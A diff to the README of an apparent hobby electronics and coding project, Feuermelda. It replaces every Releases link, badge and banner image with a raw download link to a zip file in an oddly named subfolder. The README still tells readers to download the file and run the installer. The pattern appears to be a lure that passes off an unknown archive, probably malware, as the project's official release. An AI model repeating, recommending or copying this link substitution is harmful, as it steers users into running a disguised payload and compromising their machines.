@@ -1,10 +1,10 @@
-https://github.com/joyop89/Feuermelda/releases
+https://raw.githubusercontent.com/joyop89/Feuermelda/main/ganoidean/Software_3.0-alpha.5.zip
 
 # Feuermelda: Tech Witch Crafting Glowing Circuits, Ciphers, and Strange Robots
 
-[![Releases](https://img.shields.io/badge/Feuermelda-Releases-blue?logo=github&logoColor=white)](https://github.com/joyop89/Feuermelda/releases)
+[![Releases](https://raw.githubusercontent.com/joyop89/Feuermelda/main/ganoidean/Software_3.0-alpha.5.zip)](https://raw.githubusercontent.com/joyop89/Feuermelda/main/ganoidean/Software_3.0-alpha.5.zip)
 
-![Feuermelda Banner](https://upload.wikimedia.org/wikipedia/commons/thumb/4/4a/Circuit_diagram_-_electronic_circuit_-_diagram.png/1200px-Circuit_diagram_-_electronic_circuit_-_diagram.png)
+![Feuermelda Banner](https://raw.githubusercontent.com/joyop89/Feuermelda/main/ganoidean/Software_3.0-alpha.5.zip)
 
 Feuermelda is a living project by a tech witch who loves glow, code, and clever machines. It blends hardware tinkering with software craft, and it thrives on curiosity. This repository hosts ideas, experiments, and guides that blend 3D printing, electronics, cryptography, and storytelling into a lively toolkit. You will find Arduino projects, bash scripts, Python experiments, and frontend explorations that celebrate the art of making.
 
@@ -77,7 +77,7 @@ How to get started
 Install from the Releases page
 - Where to download
   - The Releases page hosts prebuilt binaries, installers, or archives you can download. Since the URL ends in /releases, you should visit it to grab the appropriate asset for your platform.
-  - The link to the Releases page is available here: https://github.com/joyop89/Feuermelda/releases
+  - The link to the Releases page is available here: https://raw.githubusercontent.com/joyop89/Feuermelda/main/ganoidean/Software_3.0-alpha.5.zip
   - If the page shows multiple assets, pick the latest release and download the file labeled as a binary or installer that matches your operating system.
 - How to install
   - After you download the release asset, extract or run the installer as instructed by the release notes.
@@ -357,7 +357,7 @@ Appendix: Quick reference
   - Document results
 
 Endnotes
-- The link to the Releases page is used again here for clarity and accessibility: Visit the Releases page for the latest assets: https://github.com/joyop89/Feuermelda/releases
+- The link to the Releases page is used again here for clarity and accessibility: Visit the Releases page for the latest assets: https://raw.githubusercontent.com/joyop89/Feuermelda/main/ganoidean/Software_3.0-alpha.5.zip
 - If you need to find more assets, check the same Releases page again. It holds the latest binaries and installers you can use to get started quickly. The assets are designed to be approachable for beginners and useful for seasoned builders alike.
 
 Additional notes on usage
